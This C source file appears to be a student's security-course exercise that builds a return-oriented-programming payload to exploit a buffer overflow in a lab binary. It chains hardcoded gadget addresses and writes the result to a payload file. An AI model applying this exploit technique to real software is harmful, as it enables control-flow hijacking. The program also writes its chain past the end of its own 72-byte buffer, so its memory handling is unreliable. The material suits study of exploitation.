////////////////////////////////////////////////////////////////////////////////
//
//  File           : cs642-task2.c
//  Description    : Task 2
//
//   Author        : *** vardaan kapoor***
//   Last Modified : *** 4/24/2025 code complete but commenting in report is left-aim to do by thursday***
//


#include "bufferoverflow_util.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Write 8-byte value to memory at location addr+offset
// You will use to write values into your payload - 8-byte at a time
#define pack(addr, offset, value)                                              \
  (*((unsigned long long *)((char *)addr + offset)) = value)

int main(int argc, char **argv) {



  char storePayload[72];

  unsigned long long properGadget= 0x00401608; 
  unsigned long long * chainingGadgets; 

  unsigned long long returnGadgetToAlignStack= 0x0040126f; 
  chainingGadgets = (unsigned long long *)(storePayload + 72);


  unsigned long long getThatFunctionGadgetStartLine= 0x004015b4; 
 



  unsigned long long getIdFunctionGadgetStartLine= 0x00401331; 
  

  unsigned long long exitPltSection= 0x004011f4; 
  unsigned long long getThisFunctionGadgetStartLine= 0x00401590; 





  memset(storePayload, 'A', 72);


  *chainingGadgets++ = returnGadgetToAlignStack;  



  *chainingGadgets++ = getIdFunctionGadgetStartLine;   


  *chainingGadgets++ = returnGadgetToAlignStack;   


  *chainingGadgets++ = getIdFunctionGadgetStartLine;   



  *chainingGadgets++ = returnGadgetToAlignStack;  



  *chainingGadgets++ = getIdFunctionGadgetStartLine; 


  *chainingGadgets++ = returnGadgetToAlignStack;   



  *chainingGadgets++ = getThisFunctionGadgetStartLine; 

  
  *chainingGadgets++ = returnGadgetToAlignStack;   


  *chainingGadgets++ = properGadget;    

  *chainingGadgets++ = 0x01;    
  
  


  *chainingGadgets++ = 0x02;        


  *chainingGadgets++ = returnGadgetToAlignStack;  


  *chainingGadgets++ = getThatFunctionGadgetStartLine;


  *chainingGadgets++ = returnGadgetToAlignStack;   




  *chainingGadgets++ = exitPltSection;      


  write_to_file("task2-payload", storePayload, 8*25, FILE_CLEAR);

  exit(0);
}
